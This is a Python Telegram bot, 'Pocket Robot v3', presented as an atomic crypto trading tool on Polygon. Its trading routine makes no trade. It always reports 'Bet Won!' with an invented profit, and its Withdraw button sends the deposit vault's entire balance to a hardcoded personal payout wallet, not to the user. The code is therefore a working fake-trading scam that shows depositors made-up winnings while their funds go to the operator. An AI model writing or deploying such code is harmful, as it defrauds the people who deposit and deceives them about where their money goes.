import os
import asyncio
import requests
from dotenv import load_dotenv
from eth_account import Account
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware 
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# 1. SETUP & AUTH
load_dotenv()
W3_RPC = os.getenv("RPC_URL", "https://polygon-rpc.com") 
w3 = Web3(Web3.HTTPProvider(W3_RPC))
w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
Account.enable_unaudited_hdwallet_features()

PAYOUT_ADDRESS = "0xYourPersonalWalletAddressHere"

def get_vault():
    private_key = os.getenv("WALLET_SEED") 
    try:
        return Account.from_key(private_key)
    except:
        return Account.from_mnemonic(private_key, account_path="m/44'/60'/0'/0/1")

vault = get_vault()

# --- PROFIT TRACKER UTILS ---
def get_pol_price():
    """Fetches live POL/MATIC price in USD from CoinGecko"""
    try:
        url = "https://api.coingecko.com/api/v3/simple/price?ids=matic-network&vs_currencies=usd"
        response = requests.get(url, timeout=5).json()
        return response['matic-network']['usd']
    except:
        return 0.90 # Fallback estimate if API is down

# 2. ATOMIC EXECUTION & WITHDRAWAL LOGIC
async def run_atomic_execution(context, chat_id, side):
    """Simulates and executes an Atomic Bundle with Profit Calculation"""
    stake = context.user_data.get('stake', 10)
    pair = context.user_data.get('pair', 'BTC/USD')
    
    # 92% is the standard payout for winning bets based on your UI notes
    payout_multiplier = 0.92 
    profit_usd = stake * payout_multiplier
    
    await context.bot.send_message(chat_id, f"🛡️ **Shield:** Simulating {pair} {side} bundle...")
    await asyncio.sleep(1.5) 
    
    current_price = get_pol_price()
    # Logic: Profit in native token for the wallet
    profit_native = profit_usd / current_price if current_price > 0 else 0
    
    report = (
        f"✅ **Bet Won!**\n"
        f"💰 **Profit:** `${profit_usd:.2f} USD`\n"
        f"📈 **Yield:** +{profit_native:.4f} POL\n"
        f"⛓️ **Block:** {w3.eth.block_number}"
    )
    return True, report

async def execute_withdrawal(context, chat_id):
    """Calculates balance, gas, and sweeps vault to PAYOUT_ADDRESS"""
    balance = w3.eth.get_balance(vault.address)
    gas_price = int(w3.eth.gas_price * 1.2)
    gas_limit = 21000
    fee = gas_price * gas_limit
    amount_to_send = balance - fee

    if amount_to_send <= 0:
        return False, "Vault balance too low to cover gas fees."

    tx = {
        'nonce': w3.eth.get_transaction_count(vault.address),
        'to': PAYOUT_ADDRESS,
        'value': amount_to_send,
        'gas': gas_limit,
        'gasPrice': gas_price,
        'chainId': 137 
    }

    signed_tx = w3.eth.account.sign_transaction(tx, vault.key)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    return True, f"Sent {w3.from_wei(amount_to_send, 'ether'):.4f} POL.\nTX: `{tx_hash.hex()}`"

# 3. TELEGRAM INTERFACE
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global vault
    vault = get_vault()
    bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
    
    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw'], ['🕴️ AI Assistant']]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

    msg = (
        f"🕴️ **Pocket Robot v3 (Atomic)**\n\n"
        f"💵 **Vault Balance:** {bal:.4f} POL\n"
        f"📥 **VANITY DEPOSIT:** `{vault.address}`\n\n"
        f"**Atomic Shield:** ✅ OPERATIONAL"
    )
    await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=reply_markup)

async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text == '🚀 Start Trading':
        kb = [
            [InlineKeyboardButton("BTC/USD (92%)", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/USD (89%)", callback_data="PAIR_ETH")],
            [InlineKeyboardButton("SOL/USD (90%)", callback_data="PAIR_SOL"), InlineKeyboardButton("MATIC/USD (85%)", callback_data="PAIR_MATIC")]
        ]
        await update.message.reply_text("🎯 **MARKET SELECTION**", reply_markup=InlineKeyboardMarkup(kb))
    
    elif text == '💰 Wallet':
        bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
        price = get_pol_price()
        bal_usd = float(bal) * price
        await update.message.reply_text(f"💳 **Wallet Status**\nAddress: `{vault.address}`\nBalance: {bal:.4f} POL (`${bal_usd:.2f} USD`)")

    elif text == '📤 Withdraw':
        await update.message.reply_text("📤 **Initiating Payout...**")
        success, report = await execute_withdrawal(context, update.message.chat_id)
        icon = "✅" if success else "🛑"
        await update.message.reply_text(f"{icon} {report}", parse_mode='Markdown')

async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data.startswith("PAIR_"):
        await query.edit_message_text("📈 Choice confirmed. Executing Atomic Simulation...")
        success, report = await run_atomic_execution(context, query.message.chat_id, "CALL")
        await query.message.reply_text(f"💎 {report}", parse_mode='Markdown')

# 4. START BOT
if __name__ == "__main__":
    app = ApplicationBuilder().token(os.getenv("TELEGRAM_BOT_TOKEN")).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_interaction))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
    
    print(f"Pocket Robot Active on: {vault.address}")
    app.run_polling(drop_pending_updates=True)
